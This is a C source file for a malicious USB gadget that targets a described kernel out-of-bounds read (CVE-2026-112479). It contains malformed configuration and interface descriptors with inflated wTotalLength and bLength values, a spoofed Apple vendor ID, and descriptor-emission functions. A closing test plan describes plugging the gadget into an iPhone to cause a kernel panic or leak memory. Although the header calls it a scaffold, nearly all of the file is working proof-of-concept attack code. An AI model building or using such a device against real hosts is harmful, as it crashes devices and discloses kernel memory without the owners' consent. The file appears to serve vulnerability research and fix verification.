/*
 * usb_desc_oob_scaffold.c — SCAFFOLD, not an exploit.
 *
 * Target : CVE-2026-112479 (USB, malicious device -> kernel OOB read)
 * Theory : the host's configuration-descriptor walk trusts wTotalLength and
 *          per-descriptor bLength, so a device that returns fewer bytes than
 *          declared makes the host read past the transfer buffer.
 * Status : device-side scaffold. Build for a Facedancer (GreatFET) or a
 *          Raspberry Pi Zero USB gadget; the host-side test is enumeration.
 *
 * Build  : (Facedancer) use `facedancer` Python API — see
 *          usb_desc_oob_facedancer.py in this folder for the Python form.
 *          (bare-metal) arm-none-eabi-gcc for the Pi Zero gadget.
 *
 * This file is the C form for a gadget stack (e.g. Linux FunctionFS or
 * TinyUSB) that emits the malformed descriptors below.
 */

#include <stdint.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/* Malicious descriptor set.                                          */
/* ------------------------------------------------------------------ */

/* Device descriptor: claims one configuration. */
static const uint8_t device_desc[18] = {
    18, 0x01,             /* bLength, DEVICE                     */
    0x00, 0x02,           /* bcdUSB 2.00                         */
    0x00, 0x00, 0x00,     /* class/subclass/protocol (per iface) */
    64,                   /* bMaxPacketSize0                     */
    0xAC, 0x05,           /* idVendor  = 0x05AC (Apple)          */
    0x55, 0x02,           /* idProduct = 0x0255                  */
    0x00, 0x01,           /* bcdDevice 1.00                      */
    1, 2, 3,              /* iManufacturer/iProduct/iSerial      */
    1,                    /* bNumConfigurations = 1              */
};

/*
 * Configuration descriptor: wTotalLength LIES.
 * We claim 255 bytes but only provide 18. A host that iterates to
 * wTotalLength reads 237 bytes past the transfer buffer.
 */
static const uint8_t config_desc_malicious[18] = {
    9, 0x02,              /* bLength, CONFIGURATION              */
    0xFF, 0x00,           /* wTotalLength = 255  <-- BUG         */
    1,                    /* bNumInterfaces                      */
    1,                    /* bConfigurationValue                 */
    0,                    /* iConfiguration                      */
    0x80,                 /* bmAttributes (bus powered)          */
    50,                   /* bMaxPower                           */
    /* First interface descriptor. */
    9, 0x04,              /* bLength, INTERFACE                  */
    0,                    /* bInterfaceNumber                    */
    0,                    /* bAlternateSetting                   */
    0,                    /* bNumEndpoints                       */
    0xFF, 0x00, 0x00,     /* class/subclass/protocol (vendor)    */
    0,                    /* iInterface                          */
};

/* A second descriptor whose bLength is also absurd. */
static const uint8_t interface_desc_malicious[9] = {
    0xFF, 0x04,           /* bLength = 255 <-- BUG               */
    1, 0, 1,
    0xFF, 0x00, 0x00, 0
};

/* ------------------------------------------------------------------ */
/* Gadget emission                                                     */
/* ------------------------------------------------------------------ */

/*
 * GET_DESCRIPTOR(CONFIGURATION) must return *wLength* bytes or fewer.
 * The attack: return only sizeof(config_desc_malicious), while the
 * descriptor itself says wTotalLength = 255.
 */
const uint8_t *get_configuration_descriptor(uint16_t wLength,
                                            uint16_t *out_len) {
    size_t avail = sizeof(config_desc_malicious) +
                   sizeof(interface_desc_malicious);
    static uint8_t buf[64];
    memcpy(buf, config_desc_malicious, sizeof(config_desc_malicious));
    memcpy(buf + sizeof(config_desc_malicious),
           interface_desc_malicious, sizeof(interface_desc_malicious));
    *out_len = (uint16_t)(avail < wLength ? avail : wLength);
    return buf;
}

const uint8_t *get_device_descriptor(uint16_t wLength, uint16_t *out_len) {
    *out_len = (uint16_t)(sizeof(device_desc) < wLength
                          ? sizeof(device_desc) : wLength);
    return device_desc;
}

/*
 * Host-side test plan:
 *   1. Plug the gadget into an iPhone running 27.0.1.
 *   2. The host asks for the configuration descriptor with wLength=255.
 *   3. If the host trusts wTotalLength, it reads 237 bytes past its buffer.
 *   4. Observe: panic in AppleUSBHostDeviceSupport / IOUSBHostFamily, or
 *      leaked bytes in a subsequent GET_DESCRIPTOR response.
 *   5. Repeat on 27.2; the device should fail enumeration cleanly.
 */
